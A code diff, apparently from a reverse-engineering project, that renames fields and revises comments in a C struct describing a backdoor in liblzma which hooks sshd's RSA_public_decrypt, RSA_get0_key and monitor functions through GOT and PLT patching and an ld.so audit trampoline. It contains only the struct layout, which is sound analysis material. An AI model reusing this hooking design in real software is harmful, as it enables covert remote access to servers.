@@ -1208,21 +1208,21 @@ typedef struct __attribute__((packed)) backdoor_hooks_data {
 } backdoor_hooks_data_t;
 
 /*
- * Ephemeral orchestrator that stage-one uses while replaying the GOT patches; exposes pointers to the shared globals, the loader callbacks, and the mm_* hooks we ultimately install.
+ * Ephemeral orchestrator that stage one reuses while replaying the GOT patches: `hooks_data_slot_ptr` hands back liblzma’s resident blob, the symbind/RSA/mm_* entries point at the trampolines we splice into sshd, and the scratch/placeholder slots keep the structure ABI stable between bootstrap attempts.
  */
 typedef struct __attribute__((packed)) backdoor_hooks_ctx {
- u8 bootstrap_padding[0x30]; /* Stage-two zeroes this scratch space before wiring up the pointers. */
- backdoor_shared_globals_t *shared_globals; /* Published pointer to the shared globals block (NULL until init_shared_globals succeeds). */
- backdoor_hooks_data_t **hooks_data_slot; /* Address of the liblzma `hooks_data` pointer we update once the blob is parsed. */
- audit_symbind64_fn symbind64_handler; /* Backdoor symbind trampoline installed into ld.so. */
- pfn_RSA_public_decrypt_t rsa_public_decrypt_hook; /* RSA_public_decrypt replacement pushed into sshd’s PLT. */
- pfn_RSA_get0_key_t rsa_get0_key_hook; /* RSA_get0_key replacement pushed into sshd’s PLT. */
- mm_log_handler_fn mm_log_handler_hook; /* mm_log_handler shim we install when hooking sshd. */
- void *reserved_ptr0; /* Alignment/reserved slot (unused). */
- u64 bootstrap_flags; /* Scratch flags touched by init_hooks_ctx (set to 0x4 during bootstrap). */
- sshd_monitor_func_t mm_answer_keyallowed_hook; /* mm_answer_keyallowed hook entry point. */
- sshd_monitor_func_t mm_answer_keyverify_hook; /* mm_answer_keyverify hook entry point. */
- void *reserved_ptr1; /* Alignment/reserved slot for future monitor hooks. */
+ u8 bootstrap_scratch[0x30]; /* Zeroed on every init attempt; doubles as throwaway storage while we copy the ctx around during bootstrap. */
+ backdoor_shared_globals_t *shared_globals_ptr; /* Pointer to the `backdoor_shared_globals_t` shim; stays NULL until init_shared_globals publishes the shared block. */
+ backdoor_hooks_data_t **hooks_data_slot_ptr; /* Address of liblzma’s global hooks_data pointer so stage two can pull the persistent blob/documented contexts out of `.bss`. */
+ audit_symbind64_fn symbind64_trampoline; /* Backdoor symbind trampoline installed into ld.so’s audit vector (backdoor_symbind64). */
+ pfn_RSA_public_decrypt_t rsa_public_decrypt_entry; /* RSA_public_decrypt replacement pushed into sshd’s PLT. */
+ pfn_RSA_get0_key_t rsa_get0_key_entry; /* RSA_get0_key replacement pushed into sshd’s PLT. */
+ mm_log_handler_fn mm_log_handler_entry; /* mm_log_handler shim we install when hooking sshd. */
+ void *mm_log_handler_ctx_slot; /* Reserved slot for the log-hook context pointer (currently unused but keeps the struct layout stable). */
+ u64 bootstrap_state_flags; /* Scratch flags touched by init_hooks_ctx (set to 0x4 during bootstrap retries). */
+ sshd_monitor_func_t mm_answer_keyallowed_entry; /* mm_answer_keyallowed hook entry point. */
+ sshd_monitor_func_t mm_answer_keyverify_entry; /* mm_answer_keyverify hook entry point. */
+ void *pending_monitor_hook; /* Placeholder for future monitor-hook trampolines (never populated in this build). */
 } backdoor_hooks_ctx_t;
 
 /*
